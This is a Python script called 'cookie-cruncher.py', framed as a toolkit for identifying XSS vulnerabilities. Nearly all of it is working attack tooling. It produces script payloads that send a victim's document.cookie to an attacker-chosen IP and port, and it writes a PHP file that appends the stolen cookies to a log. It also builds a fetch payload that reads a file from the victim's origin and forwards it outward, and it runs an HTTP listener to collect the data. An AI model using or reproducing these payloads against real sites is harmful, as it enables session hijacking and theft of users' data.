#!/usr/bin/python3

"""
Program: cookie-cruncher.py
Date Created: 03/01/2025
Date Modified: 03/28/2025
Developer: CyberPanther232
Purpose: XSS tool designed to help assist in the identification of XSS vulnerabilities in a web application
"""

import os
import random

COOKIE_ASCII = r"""
COOKIE CRUNCHER
  🍪   🍪   🍪
[ XSS Toolkit ]
"""

DEFAULT_PORT = 8080

COOKIE_MEMES = ["cookie-monster","double-chocolate-chunk","oreos","cap-n-crunch", "keeblers-elf", "fortune-cookie"]

PHP_SCRIPT = r"""
<?php
        $cookie = $_GET["username"];
        $steal = fopen("/var/www/html/cookiefile.txt", "a+");
        fwrite($steal, $cookie ."\n");
        fclose($steal);
?>
"""

print(COOKIE_ASCII)

while True:
        print("Cookie-Cruncher.py")
        print("Select option:")
        print("1. Generate XSS script")
        print("2. Generate PHP file")
        print("3. Generate XSS alert")
        print("4. Generate XSS fetch script")
        print("5. Run HTTP Listener")
        print("6. Exit\n")
        
        try:
                option = int(input("Enter option: "))
        except:
                print("Error")

        if option == 1:
                print("\nGenerating XSS Script!\n")
                ip = str(input("Enter IP: "))
                try:
                        port = int(input("Enter Port number or press enter for default (8080): "))
                except:
                        port = DEFAULT_PORT
                
                print(f"\n\n<script>document.location='http://{ip}:{port}/{random.choice(COOKIE_MEMES)}.php?username=' + document.cookie;</script>\n\n")
        elif option == 2:
                print("Generating PHP file!")
                open('cookie-script', 'w').write(PHP_SCRIPT)
        elif option == 3:
                print("\nGenerating XSS Alert")
                print(f"\n\n<script>alert('{random.choice(COOKIE_MEMES)}')</script>\n\n")
        elif option == 4:
                ip = str(input("Enter IP: "))
                try:
                        port = int(input("Enter Port number or press enter for default (8080): "))
                except ValueError:
                        port = DEFAULT_PORT

                file = str(input("Enter filename of file you want to view: "))

                if not file:
                        print("No file entered... Please try again!")
                else:
                        # Using the f-string correctly to embed the target_location
                        target_location = f"window.location='http://{ip}:{port}/' + encodeURIComponent(data);"
                        print(f"""
        <script>
        fetch('{file}')
                .then(response => response.text())
                .then(data => {{
                {target_location}
                }});
        </script>
                        """)

        elif option == 5:
                try:
                        port = int(input("Enter Port number or press enter for default (8080): "))
                except:
                        port = DEFAULT_PORT
                try:
                        print ("Press ctrl+c to stop the server")
                        os.system(f"python3 -m http.server {port}")
                except KeyboardInterrupt:
                        print("Server down!")
                        pass
        elif option == 6:
                exit(1)

        else:
                print("Invalid option!")
